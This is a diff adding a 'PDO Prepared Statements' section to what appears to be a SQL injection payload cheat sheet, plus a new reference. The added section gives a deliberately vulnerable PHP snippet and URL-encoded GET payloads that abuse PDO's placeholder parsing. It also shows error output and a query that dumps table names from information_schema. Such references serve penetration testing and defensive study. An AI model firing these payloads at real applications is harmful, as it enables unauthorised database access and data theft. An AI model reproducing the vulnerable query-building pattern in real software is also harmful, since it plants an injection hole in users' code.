@@ -29,6 +29,7 @@
 * [Polyglot Injection](#polyglot-injection)
 * [Routed Injection](#routed-injection)
 * [Second Order SQL Injection](#second-order-sql-injection)
+* [PDO Prepared Statements](#pdo-prepared-statements)
 * [Generic WAF Bypass](#generic-waf-bypass)
     * [White Spaces](#white-spaces)
     * [No Comma Allowed](#no-comma-allowed)
@@ -365,6 +366,77 @@ password="P@ssw0rd"
 
 Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
 
+## PDO Prepared Statements
+
+PDO, or PHP Data Objects, is an extension for PHP that provides a consistent and secure way to access and interact with databases. It is designed to offer a standardized approach to database interaction, allowing developers to use a consistent API across multiple types of databases like MySQL, PostgreSQL, SQLite, and more.
+
+PDO allows for binding of input parameters, which ensures that user data is properly sanitized before being executed as part of a SQL query. However it might still be vulnerable to SQL injections if the developers allowed user input inside the SQL query.
+
+**Requirements**:
+
+* DMBS
+    * **MySQL** is vulnerable by default.
+    * **Postgres** is not vulnerable by default, unless the emulation is turned on with `PDO::ATTR_EMULATE_PREPARES => true`.
+    * **SQLite** is not vulnerable to this attack.
+
+* SQL injection anywhere inside a PDO statement: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.
+* PDO used for another SQL parameter, either with `?` or `:parameter`.
+
+    ```php
+    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
+    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';
+
+    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
+    $stmt->execute([$_GET['name']]);
+    // or
+    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
+    $stmt->execute(['name' => $_GET['name']]);
+    ```
+
+**Methodology**:
+
+**NOTE**: In PHP 8.3 and lower, the injection happens even without a null byte (`\0`). The attacker only needs to smuggle a "`:`" or a "`?`".
+
+* Detect the SQLi using `?#\0`: `GET /index.php?col=%3f%23%00&name=anything`
+
+    ```ps1
+    # 1st Payload: ?#\0
+    # 2nd Payload: anything
+    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
+    ```
+
+* Force a select \`'x\` instead of a column name and create a comment. Inject a backtick to fix the column and terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`
+
+    ```ps1
+    # 1st Payload: ?#\0
+    # 2nd Payload: x`;#
+    Column not found: 1054 Unknown column ''x' in 'SELECT'
+    ```
+
+* Inject in second parameter the payload. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`
+
+    ```ps1
+    # 1st Payload: \?#\0
+    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
+    ALL_PLUGINS
+    APPLICABLE_ROLES
+    CHARACTER_SETS
+    CHECK_CONSTRAINTS
+    COLLATIONS
+    COLLATION_CHARACTER_SET_APPLICABILITY
+    COLUMNS
+    ```
+
+* Final SQL queries
+
+    ```SQL
+    -- Before $pdo->prepare
+    SELECT `\?#\0` FROM animals WHERE name = ?
+
+    -- After $pdo->prepare
+    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
+    ```
+
 ## Generic WAF Bypass
 
 ### White Spaces
@@ -461,12 +533,13 @@ Bypass using keywords case insensitive or an equivalent operator.
 
 ## References
 
+* [A Novel Technique for SQL Injection in PDO’s Prepared Statements - Adam Kues - July 21, 2025](https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements)
 * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
 * [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023](https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
 * [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
 * [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://sqlwiki.netspi.com/)
 * [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 * [SQLi Cheatsheet - NetSparker - March 19, 2022](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-* [SQLi in INSERT worse than SELECT - Mathias Karlsson - Feb 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+* [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
 * [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
 * [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection)
